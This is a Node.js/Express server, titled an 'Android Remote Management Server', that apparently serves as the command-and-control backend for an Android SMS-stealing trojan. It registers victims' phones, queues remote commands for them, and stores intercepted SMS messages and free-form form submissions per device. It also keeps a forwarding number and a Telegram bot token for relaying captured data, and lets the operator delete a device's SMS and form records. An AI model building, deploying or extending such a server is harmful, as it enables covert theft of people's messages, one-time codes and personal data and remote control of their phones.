// -------------------- जरूरी लाइब्रेरी --------------------
const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');

// -------------------- एनवायरनमेंट चेक --------------------
if (!process.env.DATABASE_URL) {
  console.error('FATAL ERROR: DATABASE_URL not set.');
  process.exit(1);
}

// -------------------- सर्वर और डेटाबेस सेटअप --------------------
const app = express();
const PORT = process.env.PORT || 3000;

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 20000,
});

app.use(cors());
app.use(express.json());

// -------------------- DB Initialization --------------------
async function initializeDatabase() {
  const queries = [
    `CREATE TABLE IF NOT EXISTS devices (id SERIAL PRIMARY KEY, device_id TEXT UNIQUE NOT NULL, device_name TEXT, os_version TEXT, phone_number TEXT, battery_level INTEGER, last_seen TIMESTAMPTZ NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS commands (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, command_type TEXT NOT NULL, command_data TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'pending', created_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS sms_logs (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, sender TEXT NOT NULL, message_body TEXT NOT NULL, received_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS form_submissions (id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, custom_data TEXT NOT NULL, submitted_at TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP);`,
    `CREATE TABLE IF NOT EXISTS global_settings (setting_key TEXT PRIMARY KEY UNIQUE NOT NULL, setting_value TEXT);`,
    `INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES ('demo-device-12345', 'My Test Phone', 'Android 13', '+919999999999', 90, NOW(), NOW()) ON CONFLICT (device_id) DO NOTHING;`
  ];
  for (const q of queries) await pool.query(q);
  console.log('✅ Database initialized.');
}

// -------------------- APIs --------------------

// Device register
app.post('/api/device/register', async (req, res) => {
  const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
  if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id required.' });
  try {
    const existing = await pool.query('SELECT id FROM devices WHERE device_id=$1', [device_id]);
    if (existing.rows.length)
      await pool.query('UPDATE devices SET device_name=$1, os_version=$2, battery_level=$3, phone_number=$4, last_seen=NOW() WHERE device_id=$5',
        [device_name, os_version, battery_level, phone_number, device_id]);
    else
      await pool.query('INSERT INTO devices (device_id, device_name, os_version, battery_level, phone_number, last_seen, created_at) VALUES ($1,$2,$3,$4,$5,NOW(),NOW())',
        [device_id, device_name, os_version, battery_level, phone_number]);
    res.json({ status: 'success' });
  } catch (e) { console.error(e); res.status(500).json({ status: 'error', message: e.message }); }
});

// Device list
app.get('/api/devices', async (_, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM devices ORDER BY created_at ASC');
    const data = rows.map(d => ({ ...d, is_online: (new Date() - new Date(d.last_seen)) < 30000 }));
    res.json(data);
  } catch (e) { res.status(500).json({ status: 'error', message: e.message }); }
});

// SMS forward config
app.post('/api/config/sms_forward', async (req, res) => {
  await pool.query(`INSERT INTO global_settings (setting_key, setting_value)
                    VALUES ('sms_forward_number',$1)
                    ON CONFLICT(setting_key) DO UPDATE SET setting_value=$1`,
                    [req.body.forward_number]);
  res.json({ status: 'success' });
});
app.get('/api/config/sms_forward', async (_, res) => {
  const r = await pool.query(`SELECT setting_value FROM global_settings WHERE setting_key='sms_forward_number'`);
  res.json({ forward_number: r.rows[0]?.setting_value || null });
});

// Telegram config
app.post('/api/config/telegram', async (req, res) => {
  await pool.query(`INSERT INTO global_settings (setting_key,setting_value) VALUES ('telegram_bot_token',$1)
                    ON CONFLICT(setting_key) DO UPDATE SET setting_value=$1`, [req.body.telegram_bot_token]);
  await pool.query(`INSERT INTO global_settings (setting_key,setting_value) VALUES ('telegram_chat_id',$1)
                    ON CONFLICT(setting_key) DO UPDATE SET setting_value=$1`, [req.body.telegram_chat_id]);
  res.json({ status: 'success' });
});
app.get('/api/config/telegram', async (_, res) => {
  const t = await pool.query(`SELECT setting_value FROM global_settings WHERE setting_key='telegram_bot_token'`);
  const c = await pool.query(`SELECT setting_value FROM global_settings WHERE setting_key='telegram_chat_id'`);
  res.json({ telegram_bot_token: t.rows[0]?.setting_value || null, telegram_chat_id: c.rows[0]?.setting_value || null });
});

// Command send
app.post('/api/command/send', async (req, res) => {
  await pool.query('INSERT INTO commands (device_id,command_type,command_data,status) VALUES ($1,$2,$3,\'pending\')',
    [req.body.device_id, req.body.command_type, JSON.stringify(req.body.command_data)]);
  res.json({ status: 'success' });
});

// Pending commands
app.get('/api/device/:deviceId/commands', async (req, res) => {
  const { rows } = await pool.query(`SELECT * FROM commands WHERE device_id=$1 AND status='pending' ORDER BY created_at ASC`, [req.params.deviceId]);
  if (rows.length) await pool.query('UPDATE commands SET status=\'sent\' WHERE id=ANY($1::int[])', [rows.map(r => r.id)]);
  res.json(rows.map(r => ({ ...r, command_data: JSON.parse(r.command_data) })));
});

// Execute command
app.post('/api/command/:commandId/execute', async (req, res) => {
  await pool.query('UPDATE commands SET status=\'executed\' WHERE id=$1', [req.params.commandId]);
  res.json({ status: 'success' });
});

// Form submit
app.post('/api/device/:deviceId/forms', async (req, res) => {
  await pool.query('INSERT INTO form_submissions (device_id,custom_data,submitted_at) VALUES ($1,$2,NOW())',
    [req.params.deviceId, req.body.custom_data]);
  res.json({ status: 'success' });
});

// SMS logs
app.post('/api/device/:deviceId/sms', async (req, res) => {
  await pool.query('INSERT INTO sms_logs (device_id,sender,message_body,received_at) VALUES ($1,$2,$3,NOW())',
    [req.params.deviceId, req.body.sender, req.body.message_body]);
  res.json({ status: 'success' });
});

// Delete device
app.delete('/api/device/:deviceId', async (req, res) => {
  await pool.query('DELETE FROM sms_logs WHERE device_id=$1', [req.params.deviceId]);
  await pool.query('DELETE FROM form_submissions WHERE device_id=$1', [req.params.deviceId]);
  await pool.query('DELETE FROM devices WHERE device_id=$1', [req.params.deviceId]);
  res.json({ status: 'success' });
});

// Delete SMS
app.delete('/api/sms/:smsId', async (req, res) => {
  await pool.query('DELETE FROM sms_logs WHERE id=$1', [req.params.smsId]);
  res.json({ status: 'success' });
});

// Root route
app.get('/', (_, res) => {
  res.send('<h1>✅ Android Remote Management Server is Running</h1>');
});

// Start server
(async () => {
  try {
    await pool.query('SELECT NOW()');
    await initializeDatabase();
    app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
  } catch (err) {
    console.error('❌ Database connection failed:', err);
    process.exit(1);
  }
})();
